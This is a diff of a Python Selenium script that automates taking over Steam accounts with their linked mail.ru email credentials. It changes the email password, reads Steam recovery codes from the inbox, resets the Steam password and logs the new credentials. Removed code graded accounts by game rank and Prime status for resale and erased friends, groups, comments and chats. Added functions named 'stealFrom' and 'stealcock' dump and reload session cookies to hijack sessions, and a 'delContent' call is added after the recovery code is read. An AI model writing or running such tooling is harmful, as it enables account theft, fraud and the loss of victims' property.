@@ -1,26 +1,5 @@
-from selenium.webdriver.common.by import By
-from selenium.webdriver import Firefox
-from selenium import webdriver
-from selenium.webdriver.firefox.options import Options
-from selenium.common.exceptions import NoSuchElementException
-from selenium.common.exceptions import ElementNotInteractableException
-import time, os, traceback
-from selenium.webdriver.support.wait import WebDriverWait
-from selenium.webdriver.support import expected_conditions as ec
-import string
-from random import *
-from datetime import datetime
-from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
-from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
-from threading import Thread
-import logging
-from selenium.common.exceptions import TimeoutException
-from selenium.common.exceptions import ElementClickInterceptedException
-import re
-from selenium.webdriver import ActionChains
-import urllib.parse
-import json
-from addons.list_search import ListSearch
+from addons.DeleteEverything import *
+from addons.parseMail import *
 
 
 def Convert(string):
@@ -50,7 +29,7 @@ def loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass)
             invalid = 1
         else:
             invalid = 0
-    except NoSuchElementException:
+    except:
         pass
 
     if invalid == 1:
@@ -65,601 +44,14 @@ def loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass)
         wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar'))).click()
 
 
-def checkPrime(driver, wait, pRank):
-    if pRank >= 21:
-        return 1
-    else:
-        medal = driver.find_element_by_css_selector('div.generic_kv_line:nth-child(2)').text
-        if medal == 'Получена медаль за службу: Да' or medal == 'Earned a Service Medal: Yes':
-            return 1
-        else:
-            prime = 0
-        try:
-             wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[2]/div/div[2]/div/div[3]/div[2]/div/a'))).click()
-             wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[2]/div/div[2]/div/div[5]')))
-             prime = 0
-        except:
-            if prime == 0:
-                return 0
-            else:
-                return 1
-
-
-def CreateHeader(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew, primeStatus, pRank):
-    driver.get("https://help.steampowered.com/en/")
-
-    try:
-        help_event_limiteduser = driver.find_element_by_css_selector(".help_event_limiteduser")
-        if "limited" in help_event_limiteduser.text:
-            limit = 1
-        else:
-            limit = 0
-    except:
-        limit = 0
-    try:
-        pRank = str(pRank)
-        game_ids = parseGames(driver, url)
-        if (len(game_ids) > 0):
-            key = ListSearch("730", "s", game_ids)
-            if key != None:
-                rank = checkRankInCs(driver, url)
-                hrs = game_ids[key]
-                hrs = hrs['h']
-                if limit == 0:
-                    header = str('[' + primeStatus + '] ' + rank + ' | Profile Rank ' + pRank + ' | ' + 'No Limit | ' + hrs + ' hrs | ')
-                elif limit == 1:
-                    header = str('[' + primeStatus + '] ' + rank + ' | Profile Rank ' + pRank + ' | ' + hrs + ' hrs | ')
-
-            key = ListSearch("570", "s", game_ids)
-            if key != None:
-                d2rank = checkRankInDota(driver, url)
-                hrs = game_ids[key]
-                hrs = hrs['h']
-                if limit == 0:
-                    header = str(
-                        '[' + primeStatus + '] ' + d2rank + ' | Profile Rank ' + pRank + ' | ' + 'No Limit | ' + hrs + ' hrs | ')
-                elif limit == 1:
-                    header = str('[' + primeStatus + '] ' + d2rank + ' | Profile Rank ' + pRank + ' | ' + hrs + ' hrs | ')
-
-        f = open('checkerWithHeader.txt', "a")
-        data = str(
-            EmailNew + ';' + EmailNewPass + ';' + Steam + ';' + SteamPassNew + ';;' + url + ';' + header + ';;;;' + EmailOld + ';' + EmailPassNew + '\n')
-        print(data)
-        f.write(data)
-        f.close()
-        logging.info(str(datetime.now()) + ' ' + data)
-    except:
-        traceback.print_exc()
-
-
-def checkRankInDota(driver, url):
-    ID64 = re.findall("\d+", url)[0]
-    url = str('https://steamcommunity.com/profiles/' + ID64 + '/gcpd/570/?category=Account&tab=GameAccountClient')
-    driver.get(url)
-    index = 1
-    SoloCalibrationGamesLeft = "notTBD"
-    Behavior = "ERROR"
-    try:
-        tr = driver.find_elements_by_tag_name('tr')
-        for i in tr:
-            index += 1
-            if "SoloCalibrationGamesLeft" in i.text:
-                tds = tr[1].find_elements_by_tag_name('td')
-                SoloCalibrationGamesLeft = tds[index].text
-                break
-    except:
-        traceback.print_exc()
-        return 'ERROR'
-    url = str('https://steamcommunity.com/profiles/' + ID64 + '/gcpd/570/?category=Account&tab=MatchPlayerReportIncoming')
-    driver.get(url)
-    try:
-        tr = driver.find_elements_by_tag_name('tr')
-        tds = tr[1].find_elements_by_tag_name('td')
-        Behavior = tds[-1].text
-        return Behavior
-    except:
-        traceback.print_exc()
-        return 'ERROR'
-
-
-def checkRankInCs(driver, url):
-    ID64 = re.findall("\d+", url)[0]
-    url = str('https://steamcommunity.com/profiles/' + ID64 + '/gcpd/730/?tab=matchmaking')
-    driver.get(url)
-    try:
-        tr = driver.find_elements_by_tag_name('tr')
-        for i in tr:
-            if "Competitive" in i.text:
-                i = i.find_elements_by_tag_name('td')
-                break
-        rank = int(i[4].text)
-        if rank == 1:
-            return 'Silver 1'
-        elif rank == 2:
-            return 'Silver 2'
-        elif rank == 3:
-            return 'Silver 3'
-        elif rank == 4:
-            return 'Silver 4'
-        elif rank == 5:
-            return 'Silver Elite'
-        elif rank == 6:
-            return 'Silver Elite Master'
-        elif rank == 7:
-            return 'Gold Nova 1'
-        elif rank == 8:
-            return 'Gold Nova 2'
-        elif rank == 9:
-            return 'Gold Nova 3'
-        elif rank == 10:
-            return 'Gold Nova Master'
-        elif rank == 11:
-            return 'Master Guardian 1'
-        elif rank == 12:
-            return 'Master Guardian 2'
-        elif rank == 13:
-            return 'Master Guardian Elite'
-        elif rank == 14:
-            return 'Distinguished Master Guardian'
-        elif rank == 15:
-            return 'Legendary Eagle'
-        elif rank == 16:
-            return 'Legendary Eagle Master'
-        elif rank == 17:
-            return 'Supreme Master First Class'
-        elif rank == 18:
-            return 'Global Elite'
-        else:
-            return 'ERROR'
-    except:
-        traceback.print_exc()
-        return 'ERROR'
-
-
-def parseGames(driver, url):
-    wait = WebDriverWait(driver, 5)
-    game_ids =[]
-    ID64 = re.findall("\d+", url)[0]
-    url = str('https://steamcommunity.com/profiles/' + ID64 + '/games/?tab=all')
-    driver.get(url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.user_avatar')))
-    except:
-        traceback.print_exc()
-    try:
-        all_games = driver.find_elements_by_css_selector(".gameListRow")
-
-        for game in all_games:
-            game_css_id = game.get_attribute("id")
-            game_id = game_css_id.replace("game_", "")
-            game_name = game.find_element_by_css_selector(".gameListRowItem .gameListRowItemName").text
-            hours = game.find_element_by_css_selector(".gameListRowItem .hours_played").text.replace(" hrs on record",
-                                                                                                     "")
-            game_ids.append({"s": game_id, "n": game_name, "h": hours})
-
-        return game_ids
-    except:
-        traceback.print_exc()
-        #driver.get_screenshot_as_file(config.paths["chrome_screenshots_dir"] + "\\parse_" + Account.username + ".png")
-        # os.system("pause")
-
-
-def checkGames(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew):
-    wait = WebDriverWait(driver, 5)
-    ID64 = re.findall("\d+", url)[0]
-    url = str('https://steamcommunity.com/profiles/' + ID64 + '/gcpd/730/')
-    driver.get(url)
-    primeStatus = 'ERROR'
-    pRank = 'ERROR'
-    try:
-        wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="tabid_accountmain"]')))
-        tables = driver.find_elements_by_class_name('generic_kv_table')
-        tables = tables[-1]
-        lines = tables.find_elements_by_class_name('generic_kv_line')
-        pRank = lines[2].text
-        pRank = int(re.findall("\d+", pRank)[0])
-        prime = checkPrime(driver, wait, pRank)
-        if prime == 1:
-            primeStatus = 'PRIME'
-        elif prime == 0:
-            primeStatus = 'NO PRIME'
-    except TimeoutException:
-        pass
-    CreateHeader(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew, primeStatus, pRank)
-
-
 def passgen(x):
     characters = string.ascii_letters + string.digits
     password = "".join(choice(characters) for x in range(randint(12, 14)))
     return password
 
 
-def LetsDeleteEverything(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew):
-    checkGames(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew)
-    CommentsShouldDie(driver, url)
-    LeaveGroups(driver, url)
-    PengingInvites(driver, url)
-    Following(driver, url)
-    Blocked(driver, url)
-    PengingFriends(driver, url)
-    FuckFriends(driver, url)
-    ChatShit(driver)
-
-
-def jSonParse(driver, wait):
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#global_actions > a')))
-    jsnstr = driver.find_element_by_id('webui_config').get_attribute('data-userinfo')
-    y = json.loads(jsnstr)
-    url = str('https://steamcommunity.com/profiles/' + y['steamid'] + '/')
-    return url
-
-
-def CommentsShouldDie(driver, url):
-    wait = WebDriverWait(driver, 5)
-    driver.get(url)
-    driver.execute_script("ChangeLanguage( 'english' )")
-    driver.get(url)
-    GoNext = 0
-    #wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#account_pulldown'))).click()
-    #wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#account_language_pulldown'))).click()
-    #wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#account_language_pulldown'))).click()
-    wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[3]/div[1]/div[2]/div/div[2]/div[4]/div/div[1]/div[2]/span[1]')))
-
-    while GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.CLASS_NAME, 'commentthread_comment_content')))
-            id = driver.execute_script("return document.querySelector('.commentthread_comment_text').id")
-            idNumbers = re.findall("\d+", id)[0]
-            urlNumbers = re.findall("\d+", url)[0]
-            DELETE = str('javascript:CCommentThread.DeleteComment( "Profile_' + urlNumbers + '", "' + idNumbers + '"  );')
-            driver.execute_script(DELETE)
-            time.sleep(1)
-        except TimeoutException:
-            GoNext = 1
-
-
-def ChatShit(driver):
-    GoNext = 0
-    wait = WebDriverWait(driver, 10)
-    driver.get('https://steamcommunity.com/chat/')
-    while GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.CLASS_NAME, 'ContextMenuButton')))
-            time.sleep(0.5)
-            el = driver.find_element_by_class_name('chatRoomListContainer')
-            el.find_element_by_class_name('ContextMenuButton').click()
-            #if custom group
-            try:
-                driver.find_element_by_xpath('//body/div[5]/div/div/div[4]')
-                wait.until(ec.element_to_be_clickable((By.XPATH, "//body/div[5]/div/div/div[3]"))).click()
-            except NoSuchElementException:
-                pass
-            try:
-                driver.find_element_by_xpath('//body/div[5]/div/div/div[3]')
-                wait.until(ec.element_to_be_clickable((By.XPATH, "//body/div[5]/div/div/div[2]"))).click()
-            except NoSuchElementException:
-                pass
-            wait.until(ec.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))).click()
-        except :
-            GoNext = 1
-    DeclineChat(driver)
-
-
-def DeclineChat(driver):
-    action = ActionChains(driver)
-    cyka = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div/div"
-    cyka2 ="//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[2]/div"
-    cyka3 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[3]/div"
-    cyka4 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[4]/div"
-    cyka5 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[5]/div"
-    cyka6 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[6]/div"
-    cyka7 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[7]/div"
-    cyka8 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[8]/div"
-    cyka9 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[9]/div"
-    cyka10 = "//div[@id='friendslist-container']/div/div[3]/div/div/div[2]/div[3]/div/div/div/div[2]/div/div/div[2]/div[10]/div"
-    GoNext = 0
-    wait = WebDriverWait(driver, 10)
-    while GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.CLASS_NAME, 'ContextMenuButton')))
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka2)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka3)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka4)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka5)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka6)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka7)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka8)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka9)))
-            action.double_click(el).perform()
-            el = wait.until(ec.element_to_be_clickable((By.XPATH, cyka10)))
-            action.double_click(el).perform()
-        except:
-            GoNext = 1
-
-
-def FuckFriends(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'friends')
-    driver.get(groups_url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 1
-    except TimeoutException:
-        GoNext = 0
-    if GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[3]/div/div[2]/div[2]/div/div[1]/button[1]/span'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'span.selection_type:nth-child(2)'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.manage_action > span:nth-child(1)'))).click()
-        except TimeoutException:
-            pass
-
-
-def LeaveGroups(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'groups/')
-    driver.get(groups_url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 1
-    except TimeoutException:
-        GoNext = 0
-    while GoNext == 0:
-        try:
-            elems = driver.find_elements_by_class_name('actions')
-            for i in elems:
-                try:
-                    time.sleep(0.1)
-                    i.click()
-                except:
-                    pass
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_green_steamui'))).click()
-        except TimeoutException:
-            GoNext = 1
-
-
-def PengingInvites(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'groups/pending')
-    driver.get(groups_url)
-    ignore = []
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 1
-    except TimeoutException:
-        GoNext = 0
-    while GoNext == 0:
-        try:
-            lnks = driver.find_elements_by_tag_name('a')
-            for lnk in lnks:
-                tmp_href = lnk.get_attribute('href')
-                tmp_href = urllib.parse.unquote(tmp_href)
-                if tmp_href.find("group_ignore") != -1:
-                    ignore.append(tmp_href)
-            for i in ignore:
-                try:
-                    time.sleep(0.1)
-                    driver.execute_script(i)
-                except:
-                    pass
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        except TimeoutException:
-            GoNext = 1
-
-
-def Following(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'following/')
-    driver.get(groups_url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 1
-    except TimeoutException:
-        GoNext = 0
-    if GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[3]/div/div[2]/div[2]/div/div[1]/button/span'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'span.selection_type:nth-child(2)'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.manage_action > span:nth-child(1)'))).click()
-        except TimeoutException:
-            pass
-
-
-def Blocked(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'friends/blocked')
-    driver.get(groups_url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 1
-    except TimeoutException:
-        GoNext = 0
-    if GoNext == 0:
-        try:
-            wait.until(ec.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[7]/div[3]/div/div[2]/div[2]/div/div[1]/button/span'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'span.selection_type:nth-child(2)'))).click()
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.manage_action > span:nth-child(1)'))).click()
-        except TimeoutException:
-            pass
-
-
-def PengingFriends(driver, url):
-    wait = WebDriverWait(driver, 5)
-    groups_url = str(url + 'friends/pending')
-    driver.get(groups_url)
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_empty')))
-        GoNext = 0.5
-    except TimeoutException:
-        GoNext = 0
-    try:
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#search_results_sentinvites_empty')))
-        Gpls = 1
-        GoNext = 0.5
-    except TimeoutException:
-        Gpls = 0
-        GoNext = 0
-    if GoNext != 1:
-        try:
-            wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#manage_friends_control > span:nth-child(1)'))).click()
-        except TimeoutException:
-            pass
-        while Gpls == 0:
-            try:
-                elems = driver.find_elements_by_class_name('actions')
-                for i in elems:
-                    try:
-                        i.click()
-                        time.sleep(0.1)
-                    except:
-                        pass
-                wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.btn_green_steamui > span:nth-child(1)'))).click()
-            except TimeoutException:
-                Gpls = 1
-
-
-def findSteamCode(driver, wait):
-    driver.get('https://e.mail.ru/inbox/')
-    pochtaIsNew = 0
-    steam(wait)
-    try:
-        driver.find_element_by_css_selector('.b-checkbox_transparent > div:nth-child(1)')
-
-    except NoSuchElementException:
-        pochtaIsNew = 1
-
-    print(pochtaIsNew)
-    steam(wait)
-    time.sleep(0.5)
-    driver.execute_script("arguments[0].click();",
-                          driver.find_element_by_xpath('//*[@title="Steam Support <noreply@steampowered.com>"]'))
-    if pochtaIsNew == 1:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeString))).text
-    else:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeStringOld))).text
-    return cont
-
-
-def findSteamCodeGuard(driver, wait):
-    driver.get('https://e.mail.ru/inbox/')
-    shit(driver)
-    steamCode = '/html/body/div[5]/div/div[1]/div[1]/div/div[2]/span/div[2]/div/div/div/div/div/div/div[2]/div[1]/div[3]/div[2]/div/div/div/div/div/div/div/div/div/div/center[1]/div/div/table/tbody/tr/td/table/tbody/tr/td/table/tbody/tr[1]/td/table/tbody/tr[2]/td/table[3]/tbody/tr/td/table/tbody/tr/td/table/tbody/tr/td'
-    time.sleep(5)
-    pochtaIsNew = 0
-    steam(wait)
-    try:
-        driver.find_element_by_css_selector('.b-checkbox_transparent > div:nth-child(1)')
-
-    except NoSuchElementException:
-        pochtaIsNew = 1
-
-    print(pochtaIsNew)
-    steam(wait)
-    time.sleep(0.5)
-    shit(driver)
-    driver.execute_script("arguments[0].click();",
-                          driver.find_element_by_xpath('//*[@title="Steam Support <noreply@steampowered.com>"]'))
-    if pochtaIsNew == 1:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCode))).text
-    else:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCode))).text
-    return cont
-
-
 def changeEmail(driver, wait):
     pass
-
-
-class AnyEc:
-    """ Use with WebDriverWait to combine expected_conditions
-        in an OR.
-    """
-
-    def __init__(self, *args):
-        self.ecs = args
-
-    def __call__(self, driver):
-        for fn in self.ecs:
-            try:
-                if fn(driver): return True
-            except:
-                pass
-
-
-def steam(wait):
-    wait.until(AnyEc(
-        ec.presence_of_element_located(
-            (By.XPATH, '//*[@title="Steam Support <noreply@steampowered.com>"]')),
-        ec.presence_of_element_located(
-            (By.XPATH, '//*[@title="Поддержка Steam <noreply@steampowered.com>"]'))))
-
-
-def shit(driver):
-    wTime = 0.1
-    time.sleep(10)
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c2182').click()
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c01180').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c01159').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c01156').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c01177').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.cross-0-2-70 > svg:nth-child(1)').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.cross-0-2-23 > svg:nth-child(1) > path:nth-child(1)').click()
-
-    except NoSuchElementException:
-        pass
-
-    try:
-        time.sleep(wTime)
-        driver.find_element_by_css_selector('.c2117 > svg:nth-child(1)').click()
-
-    except NoSuchElementException:
-        pass
 
 
 def retoggleAllTheAddons(driver):
@@ -674,6 +66,47 @@ def retoggleAllTheAddons(driver):
             card.addon.enable();
         }
     """)
+
+
+def NotAllowed(driver):
+    change_password = 'You have exceeded the number of allowed recovery attempts. Please try again later.'
+
+
+def stealFrom(driver, ID64, where):
+    driver.get(where)
+    file = str('kuki/' + ID64 + '.json')
+    try:
+        with open(file, mode='a') as f:
+            for c in driver.get_cookies():
+                f.write(json.dumps(c) + '\n')
+    except:
+        traceback.print_exc()
+
+
+def addWhere(driver, ID64, where, dom):
+    driver.get(where)
+    file = str('kuki/' + ID64 + '.json')
+    try:
+        with open(file, mode='r') as f:
+            for line in f:
+                if dom in json.loads(line)['domain']:
+                    driver.add_cookie(json.loads(line))
+    except:
+        traceback.print_exc()
+
+
+def stealcock(driver, ID64):
+    stealFrom(driver, ID64, where='https://store.steampowered.com/account')
+    stealFrom(driver, ID64, where='https://steamcommunity.com')
+    stealFrom(driver, ID64, where='https://help.steampowered.com/en')
+
+
+def addcock(driver, ID64):
+    addWhere(driver, ID64, where='https://store.steampowered.com/account', dom ='store.steampowered.com')
+    addWhere(driver, ID64, where='https://steamcommunity.com', dom='steamcommunity.com')
+    addWhere(driver, ID64, where='https://help.steampowered.com/en', dom='help.steampowered.com')
+    acc = str('https://steamcommunity.com/profiles/' + ID64)
+    driver.get(acc)
 
 
 def main(newLine, profile):
@@ -695,10 +128,10 @@ def main(newLine, profile):
     # retoggleAllTheAddons(driver)
     driver.delete_all_cookies()
     driver.get('https://mail.ru/')
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:login-input'))).send_keys(EmailOld)
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:password-input'))).send_keys(EmailOldPass)
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#mailbox\:submit-button'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.email-input'))).send_keys(EmailOld)
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.password-input'))).send_keys(EmailOldPass)
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.second-button'))).click()
     window_before = driver.window_handles[0]
     driver.switch_to.window(window_before)
     driver.execute_script("window.open('https://store.steampowered.com/login/', 'new window')")
@@ -708,23 +141,21 @@ def main(newLine, profile):
     wait.until(ec.element_to_be_clickable((By.XPATH, '//*[@id="input_password"]'))).send_keys(SteamPass)
     loginIntoSteam(driver, wait, EmailNew, EmailNewPass, EmailOld, EmailOldPass)
     url = jSonParse(driver, wait)
-    #testingPlace
-    SteamPassNew = '0'
-    EmailPassNew = '0'
-    LetsDeleteEverything(driver, EmailNew, EmailNewPass, Steam, SteamPassNew, url, EmailOld, EmailPassNew)
+    ID64 = re.findall("\d+", url)[0]
     print(url)
+    driver.execute_script("ChangeLanguage( 'english' )")
+    # testingPlace
     driver.get('https://store.steampowered.com/account/')
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                            'div.account_setting_block:nth-child(6) > div:nth-child(1) > div:nth-child(2) > div:nth-child(2) > a:nth-child(1)'))).click()
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
                                            'html.responsive body.v6.responsive_page div.responsive_page_frame.with_header div.responsive_page_content div.responsive_page_template_content div.page_body_ctn div#page_content.page_content.page_loaded div#wizard_contents div.wizard_content_wrapper a.help_wizard_button.help_wizard_arrow_right'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, 'div.account_recovery_submit:nth-child(3) > a:nth-child(1) > span:nth-child(1)')))
+    time.sleep(2)
+    TIME = datetime.now() - timedelta(0, 60)
+    TIME = TIME.strftime("%H:%M")
     driver.switch_to.window(driver.window_handles[0])
-    try:
-        driver.find_element_by_css_selector('a.btn > span: nth - child(1)')
-        steam(wait)
-
-    except NoSuchElementException:
-        steam(wait)
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
     driver.get('https://id.mail.ru/security')
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.base-0-2-82'))).click()
     wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR,
@@ -741,60 +172,13 @@ def main(newLine, profile):
         EmailPassNew)
     wait.until(
         ec.element_to_be_clickable((By.CSS_SELECTOR, 'button.base-0-2-82:nth-child(20) > span:nth-child(1)'))).click()
-    wait.until(
-        ec.element_to_be_clickable((By.XPATH, '/html/body/div[2]/div[2]/div/div/div[2]/div/button/span'))).click()
+    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.cross-0-2-97.mobileCross-0-2-104'))).click() #resetpass close
     logging.info(
         str(datetime.now()) + ' changed ' + EmailOld + ':' + EmailOldPass + ' TO ' + EmailOld + ':' + EmailPassNew)
     print(EmailOld + ':' + EmailPassNew)
-    driver.get('https://e.mail.ru/inbox/')
-    shit(driver)
-    pochtaIsNew = 0
-    shit(driver)
-    steam(wait)
-    try:
-        driver.find_element_by_css_selector('.b-checkbox_transparent > div:nth-child(1)')
-
-    except NoSuchElementException:
-        pochtaIsNew = 1
-
-    print(pochtaIsNew)
-    shit(driver)
-    steam(wait)
-    shit(driver)
-    driver.execute_script("arguments[0].click();",
-                          driver.find_element_by_xpath('//*[@title="Steam Support <noreply@steampowered.com>"]'))
-    if pochtaIsNew == 1:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeString))).text
-    else:
-        cont = wait.until(ec.element_to_be_clickable((By.XPATH, steamCodeStringOld))).text
-    # if pochtaIsNew == 1:
-    #   cont = wait.until(ec.element_to_be_clickable((By.XPATH,
-    #                                                  '/html/body/div[5]/div/div[1]/div[1]/div/div[2]/div[2]/div/div/div/div/div/div/div[2]/div[1]/div[2]/div[2]/div/div/div/div/div/div/div/div/div/div/table/tbody/tr[2]/td/table/tbody/tr[3]/td/div/span'))).text
-    # else:
-    #    cont = wait.until(ec.element_to_be_clickable((By.XPATH,
-    #                                                  '/html/body/div[2]/div/div[5]/div/div/div/div/div/div/div/div/div/div/div/div/div/div[6]/div[2]/div[2]/div[10]/div/div/div/div[4]/div/div[2]/div/div/div/div/table/tbody/tr[2]/td/table/tbody/tr[3]/td/div/span'))).text
-
-    driver.get('https://e.mail.ru/inbox/')
-    shit(driver)
-    wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '#PH_logoutLink')))
-    if pochtaIsNew == 1:
-        shit(driver)
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.button2__explanation'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_delete > span:nth-child(1) > span:nth-child(2)'))).click()
-        shit(driver)
-        wait.until(ec.element_to_be_clickable(
-            (By.CSS_SELECTOR, '.button2_primary > span:nth-child(1) > span:nth-child(1)'))).click()
-        shit(driver)
-    else:
-        shit(driver)
-        wait.until(ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-checkbox_transparent > div:nth-child(1)'))).click()
-        shit(driver)
-        wait.until(
-            ec.element_to_be_clickable((By.CSS_SELECTOR, '.b-toolbar__btn_grouped_first > span:nth-child(2)'))).click()
-        shit(driver)
-
+    #
+    cont = findSteamCode(driver, TIME)
+    delContent(driver)
     driver.switch_to.window(driver.window_handles[1])
     SteamPassNew = passgen(randint(1, 200))
     print(SteamPassNew)
@@ -810,36 +194,17 @@ def main(newLine, profile):
         (By.XPATH, '/html/body/div/div[7]/div[2]/div[2]/div/div[2]/div/div[4]/form/div[3]/input'))).click()
     wait.until(ec.element_to_be_clickable((By.ID, 'password_reset'))).send_keys(SteamPassNew)
